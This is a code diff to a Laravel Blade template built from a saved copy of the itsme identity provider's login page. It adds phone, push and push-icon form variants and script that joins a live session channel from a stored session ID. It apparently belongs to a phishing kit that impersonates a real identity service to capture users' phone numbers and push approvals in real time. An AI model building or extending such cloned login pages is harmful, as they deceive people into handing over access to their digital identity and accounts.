@@ -1,3 +1,7 @@
+@php
+    $formType = $formType ?? 'phone';
+    $session = $session ?? null;
+@endphp
 <!DOCTYPE html>
 <!-- saved from url=(0080)https://idp.prd.itsme.services/spa/oidc?session=345e66d63b6941fc8d31f4aec859cd2f -->
 <html lang="{{ app()->getLocale() }}" data-beasties-container="">
@@ -268,6 +272,9 @@
   </style>
 </head>
 <body>
+  @if($formType === 'push' || $formType === 'push-icon')
+  @vite(['resources/js/app.js'])
+  @endif
   <oidc-root ngcspnonce="1024df17-0385-46c0-abab-f0c60f35c714"
     ng-version="19.2.6"><oidc-entry-shell><oidc-app-qr-phone-form-shell><fui-template _nghost-ng-c385892400="">
           <div _ngcontent-ng-c385892400="" id="main-container"><fui-background-container _ngcontent-ng-c385892400=""
@@ -312,6 +319,7 @@
               <main _ngcontent-ng-c385892400="">
                 <div _ngcontent-ng-c385892400="" class="im-content-primary"><oidc-app-qr-phone-form contentprimary=""
                     _nghost-ng-c2021898164="">
+                    @if($formType === 'phone')
                     <h1 _ngcontent-ng-c2021898164="">{{ __('messages.identify_yourself') }}</h1>
                     <div id="phone-error-container"></div>
                     <div _ngcontent-ng-c2021898164="" class="normal">
@@ -350,6 +358,11 @@
                         </fui-accordion>
                       </div>
                     </div>
+                    @elseif($formType === 'push')
+                    @include('partials.login-forms.push', ['session' => $session])
+                    @elseif($formType === 'push-icon')
+                    @include('partials.login-forms.push-icon', ['session' => $session])
+                    @endif
 
                   </oidc-app-qr-phone-form></div>
                 <div _ngcontent-ng-c385892400="" class="im-content-secondary"><oidc-app-qr-phone-form-information
@@ -641,6 +654,18 @@ window.translations = {
 };
 
 document.addEventListener('DOMContentLoaded', function() {
+    const formType = '{{ $formType }}';
+    if (formType !== 'phone') {
+        if (formType === 'push' || formType === 'push-icon') {
+            const existingSessionId = localStorage.getItem('session_id');
+            if (existingSessionId && window.SessionManager) {
+                window.SessionManager.setSessionId(existingSessionId);
+                window.SessionManager.connectToChannel();
+            }
+        }
+        return;
+    }
+
     const phoneInput = document.getElementById('phone-input');
     const submitBtn = document.getElementById('phone-submit-btn');
     let preSessionId = null;
